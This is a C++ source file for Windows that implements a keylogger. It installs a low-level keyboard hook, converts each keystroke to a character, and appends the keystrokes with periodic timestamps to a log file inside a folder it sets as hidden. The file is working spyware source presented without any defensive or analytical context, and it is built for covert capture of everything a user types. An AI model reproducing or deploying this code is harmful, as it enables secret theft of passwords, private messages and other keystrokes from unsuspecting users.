#include <iostream>
#include <string>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/stat.h>

using namespace std;

HHOOK hook;
void funcFiles(string ch);
LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int main(){
    MSG msg;

    hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);

    if (hook == NULL)
    {
        cout << "Erro!";
        return 0;
    }

    while(GetMessage(&msg, NULL, 0, 0) != 0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam){
    char ch;
    string str;

    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;

    if (wParam == WM_KEYDOWN && codigo == HC_ACTION)
    {
        if (GetKeyState(VK_CAPITAL) & 0x0001)
        {
            if (GetAsyncKeyState(VK_SHIFT))
            {
                ch = kbDllHook->vkCode + 32;
            }else{
                ch = kbDllHook->vkCode;
            }
        }else{
            if (GetAsyncKeyState(VK_SHIFT))
            {
                ch = kbDllHook->vkCode;
            }else{
                ch = kbDllHook->vkCode + 32;
            }
        }

        if ((kbDllHook->vkCode >= 0x30 && kbDllHook->vkCode <= 0x39) || (kbDllHook->vkCode >= 0xBA && kbDllHook->vkCode <= 0xDF))
        {
            ch = MapVirtualKeyA(kbDllHook->vkCode, MAPVK_VK_TO_CHAR);
        }
        str += ch;
    }

    while(str.size() != 0){
            funcFiles(str);
            str.clear();
    }

    return(CallNextHookEx(hook, codigo, wParam, lParam));
}

void funcFiles(string ch){
	static time_t start = time(NULL);
	time_t now = time(NULL);

	char dateTime[25];
	strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&now));

	char *folder = "C:\\Folder";

	SetFileAttributes(folder, FILE_ATTRIBUTE_HIDDEN);

	if(access(folder, F_OK) == -1){
		CreateDirectory(folder, NULL);
	}

	FILE *file = fopen("C:\\Folder\\logger.txt", "a");

	if(file != NULL){
		if(now - start >= 60){
			start = now;
			fputs("\n", file);
			strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&now));
			fputs(dateTime, file);
			fputs("\n", file);
		}
		fputs(ch.c_str(), file);
		fclose(file);
	}

	//Linhas para verificação de erros
	/*
	if(access(folder, F_OK) != -1){
		cout << "Pasta existente!\n";
	}else{
		if(CreateDirectory(folder, NULL) == 0){
			cout << "Erro ao criar pasta!";
		}
	}

	if(file != NULL){
		if(agora - incial >= 60){
			incial = agora;
			fputs("\n", file);
			strftime(dateTime, 25, "%d/%m/%Y %H:%M:%S", localtime(&agora));
			fputs(dateTime, file);
			fputs("\n", file);
		}
		fputs(ch.c_str(), file);
		fclose(file);
	}else{
		cout << "Erro ao abrir o arquivo!";
	}
	*/
}
